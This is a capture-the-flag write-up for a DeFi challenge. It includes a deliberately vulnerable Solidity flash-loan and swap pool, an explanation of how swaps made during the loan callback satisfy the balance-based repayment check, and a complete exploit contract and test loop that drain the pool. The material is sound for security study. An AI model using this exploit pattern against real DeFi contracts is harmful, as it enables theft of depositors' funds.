# yieldPool

## Challenge

We are provided with a pool that offers flash loans to users. It also has functionality for someone to provide liquidity and also for exchanging eth for token.

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import {IERC20, ERC20} from "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import {IERC3156FlashLender, IERC3156FlashBorrower} from "@openzeppelin/contracts/interfaces/IERC3156FlashLender.sol";

/**
 * @title SecureumToken
 */
contract SecureumToken is ERC20("Secureum Token", "ST") {
    constructor(uint256 amount) {
        _mint(msg.sender, amount);
    }
}

/**
 * @title YieldPool
 */
contract YieldPool is ERC20("Safe Yield Pool", "syLP"), IERC3156FlashLender {
    // The token address
    IERC20 public immutable TOKEN;
    // An arbitrary address to represent Ether 
    address public constant ETH = 0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE;
    // A constant to indicate a successful callback, according to ERC3156
    bytes32 private constant CALLBACK_SUCCESS = keccak256("ERC3156FlashBorrower.onFlashLoan");

    /**
     * @dev Initializes the pool with the token address
     * @param _token The address of the token contract
     */
    constructor(IERC20 _token) {
        TOKEN = _token;
    }

    //////// ERC3156 interface functions

    /// @inheritdoc IERC3156FlashLender
    function maxFlashLoan(address token) public view returns (uint256) {
        if (token == ETH) {
            return address(this).balance;
        } else if (token == address(TOKEN)) {
            return getReserve();
        }
        revert("Unknown token");
    }

    /**
    * @notice The fee is 1%
    * @inheritdoc IERC3156FlashLender
    */
    function flashFee(address, uint256 amount) public pure returns (uint256) {
        return amount / 100;
    }

    /// @inheritdoc IERC3156FlashLender
    function flashLoan(IERC3156FlashBorrower receiver, address token, uint256 amount, bytes calldata data)
        external
        returns (bool)
    {
        require(amount <= maxFlashLoan(token), "not enough currency");

        uint256 expected;
        if (token == ETH) 
        {
            expected = address(this).balance + flashFee(token, amount);
            (bool success,) = address(receiver).call{value: amount}("");
            require(success, "ETH transfer failed");
            success = false;
        } 
        else if (token == address(TOKEN)) 
        {
            expected = getReserve() + flashFee(token, amount);
            require(TOKEN.transfer(address(receiver), amount), "Token transfer failed");
        } 
        else 
        {
            revert("Wrong token");
        }

        require(
            receiver.onFlashLoan(msg.sender, token, amount, flashFee(token, amount), data) == CALLBACK_SUCCESS,
            "Invalid callback return value"
        );

        if (token == ETH) {
            require(address(this).balance >= expected, "Flash loan not repayed");
        }
        else {
            require(getReserve() >= expected, "Flash loan not repayed");
        }
        return true;
    }

    // custom functions
    /**
     * @dev Preview the amount of TOKEN in the liquidity pool
     * @return Amount of TOKEN in the protocol
     */
    function getReserve() public view returns (uint256) {
        return TOKEN.balanceOf(address(this));
    }

    /**
     * @dev Add liquidity, which allows earning fees
     * @param _amount The (maximum) amount of TOKEN that shall be provided as liquidity
     * @notice The actual amount of transferred TOKEN is based on the amount of ETH sent along
     * @return Amount of liquidity tokens which represent the users share of the pool
     */
    function addLiquidity(uint256 _amount) public payable returns (uint256) {
        uint256 liquidity;
        uint256 ethBalance = address(this).balance;
        uint256 tokenReserve = getReserve();

        if (tokenReserve == 0) {
            TOKEN.transferFrom(msg.sender, address(this), _amount);

            liquidity = ethBalance;
            _mint(msg.sender, liquidity);
        } else {
            uint256 ethReserve = ethBalance - msg.value;

            uint256 tokenAmount = (msg.value * tokenReserve) / (ethReserve);
            require(_amount >= tokenAmount, "Amount of tokens sent is less than the minimum tokens required");

            TOKEN.transferFrom(msg.sender, address(this), tokenAmount);

            liquidity = (totalSupply() * msg.value) / ethReserve;
            _mint(msg.sender, liquidity);
        }
        return liquidity;
    }

    /**
     * @dev Removes liquidity which has been provided before
     * @param _amount Amount of liquidity tokens to be turned in
     * @return Amount of (ETH, TOKEN) which have been returned
     */
    function removeLiquidity(uint256 _amount) public returns (uint256, uint256) {
        require(_amount > 0, "_amount should be greater than zero");
        uint256 ethReserve = address(this).balance;
        uint256 _totalSupply = totalSupply();
        uint256 ethAmount = (ethReserve * _amount) / _totalSupply;
        uint256 tokenAmount = (getReserve() * _amount) / _totalSupply;
        _burn(msg.sender, _amount);
        payable(msg.sender).transfer(ethAmount);
        TOKEN.transfer(msg.sender, tokenAmount);
        return (ethAmount, tokenAmount);
    }

    /**
     * @dev Calculates the swap output amount based on reserves. Used to preview amount of TOKEN or ETH to be bought before execution
     * @param _inputAmount Amount of input tokens (which should be sold)
     * @param _inputReserve Amount of input reserves in the protocol
     * @param _outputReserve Amount of output reserves in the protocol
     * @return Amount of output tokens (which would be bought)
     */
    function getAmountOfTokens(uint256 _inputAmount, uint256 _inputReserve, uint256 _outputReserve)
        public
        pure
        returns (uint256)
    {
        require(_inputReserve > 0 && _outputReserve > 0, "invalid reserves");
        uint256 inputAmountWithFee = _inputAmount * 99;
        uint256 numerator = inputAmountWithFee * _outputReserve;
        uint256 denominator = (_inputReserve * 100) + inputAmountWithFee;
        return numerator / denominator;
    }

    /**
     * @dev Swap ETH to TOKEN
     * @notice Provided ETH will be sold for TOKEN
     */
    function ethToToken() public payable {
        uint256 tokenReserve = getReserve();
        uint256 tokensBought = getAmountOfTokens(msg.value, address(this).balance - msg.value, tokenReserve);

        TOKEN.transfer(msg.sender, tokensBought);
    }

    /**
     * @dev Swap TOKEN to ETH
     * @param _tokensSold The amount of TOKEN that should be sold
     */
    function tokenToEth(uint256 _tokensSold) public {
        uint256 tokenReserve = getReserve();
        uint256 ethBought = getAmountOfTokens(_tokensSold, tokenReserve, address(this).balance);
        TOKEN.transferFrom(msg.sender, address(this), _tokensSold);
        payable(msg.sender).transfer(ethBought);
    }


    receive() external payable {}
}
```

Challenge Description:

You got your hands on 0.1 ETH, and of course you would like to stack more. Luckily there's a promising DeFi protocol which allows depositors to earn fees on both dex swaps and flash loans from others. But it takes so long to earn any meaningful amount...

Can you do faster?

📌 Drain at least `100 ETH` from the yield pool.


## Solution

The problem here is that the developers have not implemented any security measures against reentrancy attacks. As the flashloan function only checks if the balance is the same (plus the fee) after the transfer we can exploit this by getting a flashloan in eth and then exchanging the eth we got as well as the tokens. For example, if we have 0.1 eth, we can borrow 10 eth and then send them plus our 0.1 eth to the ethToToken() function. When the contract checks if the flashLoan returns his money 

1. Get a flashloan of 100x the eth we have.
2. Exchange our whole eth balance for tokens using ethToToken().
3. Require at the end passes as the pool holds exactly the amount of eth it needs.
4. Get a flashloan of 100x the token we have.
5. Exchange our whole token balance for eth using tokenToEth().
6. Require at the end passes as the pool holds exactly the amount of token it needs.
7. Repeat until we have 100 ether.

In our case doing this 1 time is already sufficient as we only need 100 eth.

To exploit this I wrote a simple exploit contract that we can use:

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import {IERC20, ERC20} from "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import {IERC3156FlashLender, IERC3156FlashBorrower} from "@openzeppelin/contracts/interfaces/IERC3156FlashLender.sol";
import "./YieldPool.sol";

contract Exploiter is IERC3156FlashBorrower
{
    address owner;
    YieldPool pool;
    IERC20 secureumToken;
    bool lastAttackWasETH = false;

    constructor(address target) payable
    {
        pool = YieldPool(payable(target));
        secureumToken = pool.TOKEN();
        owner = msg.sender;
    }

    function attackETH() external payable
    {
        // Get a loan in ETH.
        lastAttackWasETH = true;
        pool.flashLoan(this, pool.ETH(), address(this).balance * 100, "");
    }

    function attackToken() external payable
    {
        // Get a loan in tokens.
        lastAttackWasETH = false;
        pool.flashLoan(this, address(secureumToken), secureumToken.balanceOf(address(this)) * 100, "");
    }

    function drain() external
    {
        //Withdraw all our money at the end
        owner.call{value: address(this).balance}("");
    }

    function onFlashLoan(
        address initiator,
        address token,
        uint256 amount,
        uint256 fee,
        bytes calldata data
    ) external returns (bytes32)
    {
        //Check if we get a token flashloan or its just the call from the eth loan
        if (!lastAttackWasETH)
        {
            secureumToken.approve(address(pool), secureumToken.balanceOf(address(this)));
            pool.tokenToEth(secureumToken.balanceOf(address(this)));
        }

        return keccak256("ERC3156FlashBorrower.onFlashLoan");
    }

    receive() external payable {
        //We get a eth flashloan
        if (lastAttackWasETH)
        {
            pool.ethToToken{value: address(this).balance}();
        }
    }
}
```


My POC:

```solidity
Exploiter exploiter = new Exploiter{value: 0.1 ether}(address(yieldPool));

uint256 counter = 0;
while (address(exploiter).balance < 100 ether)
{
    if (counter % 2 == 0)
    {
        exploiter.attackETH();
    }
    else
    {
        exploiter.attackToken();
    }

    counter++;
}

exploiter.drain(); 
```

This solves the testcase.